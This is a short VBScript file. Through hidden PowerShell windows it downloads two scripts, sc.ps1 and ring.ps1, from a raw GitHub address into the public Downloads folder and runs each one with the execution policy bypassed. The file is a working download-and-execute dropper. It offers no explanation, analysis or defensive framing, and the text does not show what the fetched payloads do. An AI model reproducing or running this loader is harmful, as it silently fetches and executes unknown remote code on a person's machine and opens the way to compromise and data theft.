Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/GALVINVN/refs/heads/main/sc.ps1 -OutFile C:\Users\Public\Downloads\sc.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\sc.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/GALVINVN/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
